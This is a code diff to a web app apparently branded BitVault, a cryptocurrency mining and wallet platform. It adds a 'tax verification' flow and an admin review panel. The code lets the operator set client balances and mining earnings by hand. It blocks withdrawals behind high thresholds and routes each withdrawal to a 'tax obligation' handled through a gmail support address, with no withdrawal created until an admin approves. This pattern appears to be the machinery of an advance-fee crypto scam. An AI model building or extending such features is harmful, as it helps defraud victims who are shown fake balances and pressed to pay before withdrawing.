@@ -1443,7 +1443,7 @@
             inset: 0;
             background: rgba(0,0,0,0.75);
             backdrop-filter: blur(8px);
-            z-index: 500;
+            z-index: 3000;
             opacity: 0;
             pointer-events: none;
             transition: 0.3s;
@@ -1451,6 +1451,7 @@
             align-items: center;
             justify-content: center;
             padding: 20px;
+            overflow: auto;
         }
         .modal-overlay.active {
             opacity: 1;
@@ -1463,7 +1464,7 @@
             padding: 24px 28px;
             width: 100%;
             max-width: 440px;
-            max-height: 90vh;
+            max-height: calc(100dvh - 40px);
             overflow-y: auto;
             transform: scale(0.96);
             transition: 0.3s cubic-bezier(0.22,1,0.36,1);
@@ -1472,6 +1473,8 @@
         .modal-overlay.active .modal {
             transform: scale(1);
         }
+        body:has(#modalOverlay.active){overflow:hidden!important}
+        body:has(#modalOverlay.active) #mobileBottomNav{display:none!important}
         .modal-header {
             display: flex;
             justify-content: space-between;
@@ -2527,7 +2530,8 @@ html.bv-session-restoring body{background:#020812!important}
 #modalContent.bv-address-modal{
   width:min(520px,calc(100vw - 28px));max-width:520px;
   background:linear-gradient(180deg,#071326,#030c18);
-  border:1px solid rgba(120,72,255,.38);border-radius:22px;overflow:visible;
+  border:1px solid rgba(120,72,255,.38);border-radius:22px;overflow-y:auto;
+  max-height:calc(100dvh - 40px);
   box-shadow:0 28px 80px rgba(0,0,0,.58),0 0 55px rgba(108,60,255,.07)
 }
 .bv-address-screen{padding:26px 24px 22px;text-align:center}
@@ -2576,7 +2580,7 @@ html.bv-session-restoring body{background:#020812!important}
 #modalContent.bv-withdraw-modal{
   width:min(560px,calc(100vw - 28px));max-width:560px;
   background:linear-gradient(180deg,#071526,#030b16);border:1px solid rgba(49,124,180,.34);
-  border-radius:21px;overflow:visible;box-shadow:0 26px 80px rgba(0,0,0,.55)
+  border-radius:21px;overflow-y:auto;max-height:calc(100dvh - 40px);box-shadow:0 26px 80px rgba(0,0,0,.55)
 }
 .bv-withdraw-wrap{padding:22px}
 .bv-withdraw-title{display:flex;justify-content:space-between;align-items:center}
@@ -2602,6 +2606,7 @@ html.bv-session-restoring body{background:#020812!important}
 .bv-security-notice i{color:#ffc400}.bv-security-notice strong{display:block;color:#f1bf13;font-size:.72rem}.bv-security-notice span{display:block;color:#9ba9bc;font-size:.68rem;line-height:1.45;margin-top:2px}
 .bv-pin-input{position:relative}.bv-pin-input input{padding-right:44px!important}.bv-pin-eye{position:absolute;right:8px;top:50%;transform:translateY(-50%);width:32px;height:32px;border:0;border-radius:8px;background:rgba(0,212,255,.07);color:#8ea6c4;cursor:pointer}.bv-pin-eye:hover{color:#00d4ff}
 .bv-tax-modal{width:min(600px,calc(100vw - 24px));max-width:600px;padding:0!important;overflow:hidden!important}.bv-tax-modal .modal-header{padding:18px 18px 12px;margin:0}.bv-tax-modal .modal-header h3{font-size:1rem;line-height:1.3;padding-right:8px}.bv-tax-body{max-height:66vh;overflow-y:auto;padding:0 18px 16px}.bv-tax-body p{font-size:.78rem;line-height:1.55}.bv-tax-list{display:grid;gap:8px;margin:12px 0}.bv-tax-row{display:grid;grid-template-columns:minmax(0,1fr) auto auto;gap:10px;align-items:center;padding:11px 12px;border:1px solid rgba(64,128,255,.11);border-radius:10px;background:rgba(5,10,20,.44)}.bv-tax-country{font-weight:800}.bv-tax-rate{color:#8da2bd;font-weight:700}.bv-tax-amount{font-weight:900;color:#f2f6ff}.bv-tax-actions{display:flex;gap:10px;padding:14px 18px 18px;border-top:1px solid rgba(64,128,255,.08);background:#081225}.bv-tax-actions .btn{flex:1;margin:0}.admin-record-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}.admin-record-list{display:grid;gap:8px;max-height:300px;overflow:auto}.admin-record-row{display:grid;grid-template-columns:minmax(0,1fr) auto;gap:8px;align-items:center;padding:10px;border:1px solid rgba(64,128,255,.09);border-radius:10px;background:rgba(5,10,20,.4)}.admin-record-row small{display:block;color:var(--text-muted);margin-top:3px}
+.bv-tax-verification-modal{width:min(540px,calc(100vw - 24px));max-width:540px}.bv-tax-ticket{padding:16px;border:1px solid rgba(0,212,255,.16);border-radius:14px;background:rgba(0,212,255,.05)}.bv-tax-ticket strong{display:block;color:#f3f7ff}.bv-tax-ticket span{display:block;margin-top:5px;color:var(--text-muted);font-size:.76rem;line-height:1.5}.tax-admin-card{padding:14px;border:1px solid rgba(64,128,255,.11);border-radius:12px;background:rgba(5,10,20,.42);margin-bottom:10px}.tax-admin-grid{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:7px;margin-top:10px;font-size:.75rem}.tax-admin-grid span{color:var(--text-muted)}.tax-admin-actions{display:flex;gap:8px;flex-wrap:wrap;margin-top:12px}.tax-admin-actions button{width:auto!important;margin:0!important;padding:8px 11px!important;font-size:.7rem!important}
 
 @keyframes bvCoinFloat{0%,100%{transform:translate(-50%,-50%) translateY(-5px)}50%{transform:translate(-50%,-50%) translateY(7px)}}
 @keyframes bvGlowBreath{0%,100%{opacity:.65;transform:translateX(-50%) scale(.94)}50%{opacity:1;transform:translateX(-50%) scale(1.08)}}
@@ -2621,7 +2626,7 @@ html.bv-session-restoring body{background:#020812!important}
   .bv-wallet-head h2{font-size:1.28rem}
   body:has(#modalOverlay.active) #mobileBottomNav{display:none!important}
   #modalOverlay.active{align-items:flex-start!important;overflow-y:auto!important;padding:10px 8px max(24px,env(safe-area-inset-bottom))!important}
-  #modalContent.bv-address-modal,#modalContent.bv-withdraw-modal{width:calc(100vw - 16px)!important;max-height:none!important;overflow:visible!important;margin:auto 0!important;border-radius:17px!important}
+  #modalContent.bv-address-modal,#modalContent.bv-withdraw-modal{width:calc(100vw - 16px)!important;max-height:calc(100dvh - 20px)!important;overflow-y:auto!important;margin:auto 0!important;border-radius:17px!important}
   .bv-address-screen{padding:18px 14px 16px}
   .bv-address-screen h3{font-size:1.22rem}.bv-address-screen .lead{font-size:.72rem;margin-top:6px}
   .bv-orbit-scene{width:180px;height:132px;margin:7px auto 6px;transform:scale(.76)}
@@ -3305,6 +3310,8 @@ html.bv-session-restoring body{background:#020812!important}
                 <div id="adminEmptyState" class="empty-state" style="display:none;padding:32px;"><div class="icon"><i class="fas fa-users"></i></div><h3>No clients yet</h3><p>Clients will appear here when they create accounts</p></div></div>
                 <div class="card" style="margin-bottom:20px;"><div class="card-header"><span class="card-title">Support Messages</span><span class="badge badge-pro" id="supportBadge" style="display:none;background:rgba(0,212,255,0.10);color:var(--electric-blue);padding:2px 12px;border-radius:10px;font-size:0.7rem;font-weight:600;">0 New</span><span class="icon-badge"><i class="fas fa-envelope"></i></span></div>
                 <div id="supportMessagesList" style="max-height:350px;overflow-y:auto;"><div class="empty-state" style="padding:24px;"><div class="icon"><i class="fas fa-inbox"></i></div><h3 style="font-size:0.9rem;">No support messages</h3><p style="font-size:0.8rem;">Client messages will appear here</p></div></div></div>
+                <div class="card" style="margin-bottom:20px;"><div class="card-header"><span class="card-title"><i class="fas fa-shield-halved"></i> Tax Verification</span><span class="badge badge-pro" id="taxVerificationBadge" style="display:none;background:rgba(255,165,2,.10);color:var(--warning);padding:2px 12px;border-radius:10px;font-size:.7rem;font-weight:600;">0 Pending</span><span class="icon-badge"><i class="fas fa-file-shield"></i></span></div>
+                <div id="taxVerificationList" style="max-height:430px;overflow-y:auto;"><div class="empty-state" style="padding:24px;"><div class="icon"><i class="fas fa-file-circle-check"></i></div><h3 style="font-size:.9rem;">No tax-verification requests</h3><p style="font-size:.8rem;">Student requests will appear here.</p></div></div></div>
             </div>
 
             <div id="page-contact" class="page hidden">
@@ -4443,6 +4450,35 @@ html.bv-session-restoring body{background:#020812!important}
                 return `<tr class="client-row" data-email="${u.email}"><td data-label="Client"><div style="display:flex;align-items:center;gap:8px;"><div class="user-avatar" style="width:24px;height:24px;font-size:0.6rem;">${u.profilePhoto?`<img src="${u.profilePhoto}" alt="" style="width:100%;height:100%;object-fit:cover;border-radius:50%">`:initials}</div><span style="font-weight:600;">${u.name||'Unknown'}</span>${u.frozen?'<span style="margin-left:6px;padding:1px 8px;border-radius:4px;font-size:0.6rem;font-weight:700;background:rgba(255,71,87,0.10);color:var(--danger);border:1px solid rgba(255,71,87,0.10);">FROZEN</span>':''}</div></td><td data-label="Email" style="font-size:0.8rem;color:var(--text-muted);">${u.email}</td><td data-label="USDT"><span class="val">$${(u.usd||0).toLocaleString()}</span></td><td data-label="BTC"><span class="val">${(u.btc||0).toFixed(8)}</span></td><td data-label="Mining" style="color:var(--electric-blue);font-weight:700;">$${mining.toFixed(2)}</td><td data-label="Rigs"><span>${(u.rigs||[]).length}</span>${active?'<span style="display:inline-block;margin-left:5px;padding:1px 6px;border-radius:8px;font-size:.55rem;background:rgba(0,229,160,.08);color:var(--success);">ALWAYS RUNNING</span>':''}</td><td data-label="Refs">${(u.referrals||[]).length}</td><td data-label="Joined" style="font-size:0.7rem;color:var(--text-muted);">${u.joined?new Date(u.joined).toLocaleDateString():'-'}</td><td data-label="Actions"><div class="manage-btns"><button class="btn-view" onclick="openStudentRecordEditor('${encodeURIComponent(u.email)}')"><i class="fas fa-pen-to-square"></i> Records</button><button class="btn-view" onclick="viewClientTx('${u.email}')"><i class="fas fa-list"></i> Ledger</button><button class="btn-edit" onclick="openSendModal('${u.email}','${u.name||'Unknown'}')"><i class="fas fa-paper-plane"></i> Send</button><button class="btn-edit" onclick="openMiningModal('${u.email}','${u.name||'Unknown'}')"><i class="fas fa-hammer"></i> Mining</button><button class="btn-edit" onclick="resetSingleClient('${u.email}','${u.name||'Unknown'}')"><i class="fas fa-undo"></i> Reset</button><button class="btn-edit" style="background:${u.frozen?'rgba(0,212,255,0.08)':'rgba(255,215,0,0.08)'};color:${u.frozen?'var(--electric-blue)':'var(--gold)'};" onclick="toggleFreezeClient('${u.email}','${u.name||'Unknown'}')"><i class="fas fa-snowflake"></i> ${u.frozen?'Unfreeze':'Freeze'}</button><button class="btn-danger-sm" onclick="deleteClient('${u.email}','${u.name||'Unknown'}')"><i class="fas fa-trash"></i> Delete</button></div></td></tr>`;
             }).join('');
             renderSupportMessages();
+            renderTaxVerifications();
+        }
+
+        async function renderTaxVerifications(){
+            const list=document.getElementById('taxVerificationList'),badge=document.getElementById('taxVerificationBadge'); if(!list)return;
+            let requests=[]; if(firebaseOnline&&db){try{const snap=await db.ref('taxVerifications').once('value'),data=snap.val();if(data)requests=Object.values(data).sort((a,b)=>Number(b.createdAt)-Number(a.createdAt));}catch(e){console.warn('Tax verification load failed',e);}}
+            const pending=requests.filter(r=>r.status==='Pending Review').length;
+            if(badge){badge.textContent=pending+' Pending';badge.style.display=pending?'inline-block':'none';}
+            if(!requests.length){list.innerHTML='<div class="empty-state" style="padding:24px;"><div class="icon"><i class="fas fa-file-circle-check"></i></div><h3 style="font-size:.9rem;">No tax-verification requests</h3><p style="font-size:.8rem;">Student requests will appear here.</p></div>';return;}
+            list.innerHTML=requests.map(r=>`<div class="tax-admin-card"><div class="msg-header"><div><strong>${r.studentName||'Student'}</strong><div style="font-size:.7rem;color:var(--text-muted);">${r.studentEmail||''}</div></div><div style="text-align:right"><span style="font-size:.64rem;color:${r.status==='Approved'?'var(--success)':r.status==='Rejected'?'var(--danger)':'var(--warning)'};font-weight:800">${r.status}</span><div style="font-size:.62rem;color:var(--text-dim);margin-top:3px">${new Date(r.createdAt).toLocaleString()}</div></div></div><div class="tax-admin-grid"><div><span>Request</span><br><b>${r.id}</b></div><div><span>Amount</span><br><b>${Number(r.amount||0).toFixed(8)} BTC</b></div><div><span>Wallet value</span><br><b>${formatUSDT(Number(r.walletValueUsd||0))}</b></div><div><span>Address</span><br><b style="word-break:break-all">${r.walletAddress||''}</b></div></div><div class="tax-admin-actions"><button class="btn btn-primary" onclick="updateTaxVerification('${r.id}','Approved')"><i class="fas fa-check"></i> Approve</button><button class="btn btn-danger" onclick="updateTaxVerification('${r.id}','Rejected')"><i class="fas fa-xmark"></i> Reject</button><button class="btn btn-outline" onclick="updateTaxVerification('${r.id}','Contacted')"><i class="fas fa-headset"></i> Mark Contacted</button></div></div>`).join('');
+        }
+        async function updateTaxVerification(id,status){
+            if(!firebaseOnline||!db)return toast('No connection to server','error');
+            try{
+                const requestSnap=await db.ref('taxVerifications/'+id).once('value'),request=requestSnap.val();
+                if(!request)return toast('Tax verification request not found','error');
+                if(status==='Approved'&&!request.withdrawalCreated){
+                    const userSnap=await db.ref('users/'+safeKey(request.studentEmail)).once('value'),student=userSnap.val();
+                    if(!student)return toast('Student account not found','error');
+                    student.txs=student.txs||[];
+                    const existing=student.txs.some(tx=>tx.taxVerificationId===id);
+                    if(!existing)student.txs.push({type:'withdraw',amount:-Number(request.amount),currency:'BTC',status:'Pending',date:Date.now(),details:`Tax-verified withdrawal to ${String(request.walletAddress||'').substring(0,12)}...`,walletAddress:request.walletAddress,reference:'WD-'+Date.now(),taxVerificationId:id,walletRequirementUsd:10000,minimumUsd:Number(request.minimumUsd||3000)});
+                    student.lastModified=Date.now();
+                    await db.ref('users/'+safeKey(request.studentEmail)).set(student);
+                    const localUsers=getAllUsers();localUsers[request.studentEmail]=student;setAllUsers(localUsers);
+                }
+                await db.ref('taxVerifications/'+id).update({status,withdrawalCreated:status==='Approved'?true:!!request.withdrawalCreated,updatedAt:Date.now(),updatedBy:currentUser.email});
+                await renderTaxVerifications();toast(status==='Approved'?'Tax verification approved and withdrawal queued.':'Tax verification marked '+status,'success');
+            }catch(e){console.warn('Tax verification update failed',e);toast('Could not update tax verification','error');}
         }
 
         async function renderSupportMessages(){
@@ -4923,7 +4959,7 @@ html.bv-session-restoring body{background:#020812!important}
 
                     <h4 style="margin:18px 0 8px;">Action Required</h4>
 
-                    <p>Before your withdrawal can be finalized, your applicable tax obligation must be addressed. By selecting <b>“Confirm &amp; Proceed”</b>, you acknowledge that you understand your tax and reporting responsibilities and authorize <b>BitVault Support</b> to assist with the required tax-compliance process and withdrawal finalization.</p>
+                    <p>Before your withdrawal can be finalized, your applicable tax obligation must be addressed. By selecting <b>“Proceed to Contact Support”</b>, you acknowledge that you understand your tax and reporting responsibilities and authorize <b>BitVault Support</b> to assist with the required tax-compliance process.</p>
 
                     <div style="margin-top:16px;padding:14px;border-radius:12px;background:rgba(0,212,255,0.06);border:1px solid rgba(0,212,255,0.12);">
                         <div style="font-size:.78rem;color:var(--text-muted);margin-bottom:5px;">For tax-compliance assistance and withdrawal finalization:</div>
@@ -4934,7 +4970,7 @@ html.bv-session-restoring body{background:#020812!important}
                 </div>
                 <div class="bv-tax-actions">
                     <button class="btn btn-outline" onclick="cancelTaxComplianceNotice()">Cancel</button>
-                    <button class="btn btn-danger" id="taxConfirmButton" onclick="confirmTaxComplianceAndWithdraw()">Confirm &amp; Proceed</button>
+                    <button class="btn btn-danger" id="taxConfirmButton" onclick="confirmTaxComplianceAndWithdraw()">Proceed to Contact Support</button>
                 </div>`;
         }
 
@@ -4963,39 +4999,11 @@ html.bv-session-restoring body{background:#020812!important}
             if(!addr||addr.length<10){ window._pendingStudentWithdrawal=null; return toast('Enter a valid BTC wallet address','error'); }
             const confirmButton=document.getElementById('taxConfirmButton'); if(confirmButton){confirmButton.disabled=true;confirmButton.textContent='Processing…';}
 
-            const requestId='TX-'+Date.now();
-            u.txs=u.txs||[];
-            u.txs.push({
-                type:'withdraw',
-                amount:-amt,
-                currency:'BTC',
-                status:'Pending',
-                date:Date.now(),
-                details:`Withdrawal request to ${addr.substring(0,12)}...`,
-                walletAddress:addr,
-                reference:requestId,
-                walletRequirementUsd:10000,
-                walletValueUsd:walletValueUsd,
-                minimumUsd:minWithdrawUsd,
-                taxComplianceRequired:true,
-                taxComplianceAcknowledged:true,
-                taxComplianceSupport:'bitvaultsupportteam@gmail.com'
-            });
+            if(!firebaseOnline||!db){if(confirmButton){confirmButton.disabled=false;confirmButton.textContent='Proceed to Contact Support';}return toast('A server connection is required to contact Tax Verification Support.','error');}
 
-            u.lastModified=Date.now();
-            all[u.email]=u;
-            setAllUsers(all);
-            currentUser=u;
-
-            if(firebaseOnline&&db){
-                try{ await db.ref('users/'+safeKey(u.email)).set(u); }
-                catch(e){ console.warn('Withdrawal sync failed:',e); }
-            }
-
-            window._pendingStudentWithdrawal=null;
-            updateAllBalances();
-            renderWallet();
-            closeModal();
+            const requestId='TAX-'+Date.now();
+            const request={id:requestId,studentEmail:u.email,studentName:u.name||'Student',amount:amt,walletAddress:addr,walletValueUsd,minimumUsd:minWithdrawUsd,status:'Pending Review',createdAt:Date.now(),updatedAt:Date.now(),taxEmailSent:false};
+            try{await db.ref('taxVerifications/'+requestId).set(request);}catch(e){console.warn('Tax verification request failed:',e);if(confirmButton){confirmButton.disabled=false;confirmButton.textContent='Proceed to Contact Support';}return toast('Could not connect your request to Tax Verification Support. Please try again.','error');}
 
             let taxEmailSent=false;
             if(emailjsReady){
@@ -5019,20 +5027,21 @@ html.bv-session-restoring body{background:#020812!important}
                 };
 
                 try{
-                    await emailjs.send(EMAILJS_SERVICE_ID,EMAILJS_WITHDRAW_TEMPLATE,emailData);
-                }catch(e){
-                    console.warn('Withdrawal email failed:',e);
-                }
-
-                try{
                     await emailjs.send(EMAILJS_SERVICE_ID,EMAILJS_TAX_TEMPLATE,emailData);
                     taxEmailSent=true;
                 }catch(e){
                     console.warn('Tax compliance email failed:',e);
                 }
             }
+            try{await db.ref('taxVerifications/'+requestId).update({taxEmailSent,taxEmailUpdatedAt:Date.now()});}catch(e){}
+            window._pendingStudentWithdrawal=null;
+            openTaxVerificationModal({...request,taxEmailSent});
+            toast(taxEmailSent?'Tax notice sent to '+u.email:'Tax Verification Support was contacted, but the email could not be sent. Check EmailJS configuration.',taxEmailSent?'success':'warning');
+        }
 
-            toast(taxEmailSent?'Withdrawal submitted and tax email sent to '+u.email:'Withdrawal submitted, but the tax email could not be sent. Check EmailJS configuration.',taxEmailSent?'success':'warning');
+        function openTaxVerificationModal(request){
+            const overlay=document.getElementById('modalOverlay'),content=document.getElementById('modalContent');overlay.classList.add('active');content.className='modal bv-tax-verification-modal';
+            content.innerHTML=`<div class="modal-header"><h3><i class="fas fa-shield-halved"></i> TAX VERIFICATION</h3><button class="modal-close" onclick="closeModal()"><i class="fas fa-times"></i></button></div><div class="modal-body"><div class="bv-tax-ticket"><strong>Your request is connected to BitVault Support</strong><span>Reference: ${request.id}</span><span>Status: Pending Review</span><span>Amount under review: ${Number(request.amount).toFixed(8)} BTC</span></div><p style="margin-top:16px;color:var(--text-muted);font-size:.8rem;line-height:1.6;">The Tax Verification team can now review this request in the Admin Control Center. ${request.taxEmailSent?'A tax-compliance email has also been sent to your registered email address.':'The request was created, but the notification email could not be delivered.'} No withdrawal transaction has been created yet.</p><div style="margin-top:14px;padding:12px;border-radius:11px;background:rgba(255,165,2,.07);border:1px solid rgba(255,165,2,.14);font-size:.75rem;color:#c9d2df;line-height:1.55;"><i class="fas fa-clock" style="color:var(--warning);margin-right:6px"></i> Support will contact you regarding the required verification steps.</div></div><button class="btn btn-primary" onclick="closeModal()" style="margin-top:14px">Done</button>`;
         }
         async function processWithdraw(){ const amt=parseFloat(document.getElementById('witAmount')?.value); if(!amt||amt<=0) return toast('Enter valid amount','error'); let all=getAllUsers(), u=all[currentUser.email]; if(!u) return toast('Account not found','error'); const minWithdraw=3000, walletBtcUsd=(u.btc||0)*btcPrice; if(amt<minWithdraw) return toast('Minimum withdrawal is $3,000','error'); if(walletBtcUsd<10000) return toast('Your BTC wallet must hold at least $10,000 worth of BTC before you can withdraw.','error'); if((u.usd||0)<amt) return toast('Insufficient balance','error'); u.txs=u.txs||[]; u.txs.push({type:'withdraw',amount:-amt,currency:'USD',status:'Pending',date:Date.now(),details:'Withdrawal to external wallet',minimumUsd:minWithdraw,walletRequirementUsd:10000,walletValueUsd:walletBtcUsd}); u.lastModified=Date.now(); setAllUsers(all); currentUser=u; if(firebaseOnline&&db) try{ await db.ref('users/'+safeKey(u.email)).set(u); }catch(e){} updateAllBalances(); renderWallet(); closeModal(); toast('Withdrawal request submitted','success'); }
         function updateConvertPreview(){ const input=document.getElementById('convBtcAmt'), btn=document.querySelector('#modalContent .btn-gold'); if(!input||!btn) return; const amt=parseFloat(input.value)||0, usd=amt*btcPrice, fee=usd*0.001; const usdEl=document.getElementById('convUsdVal'), feeEl=document.getElementById('convFee'); if(usdEl) usdEl.textContent='$'+usd.toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2}); if(feeEl) feeEl.textContent='$'+fee.toFixed(2); btn.disabled=(amt<=0||amt>currentUser.btc||usd<100); }
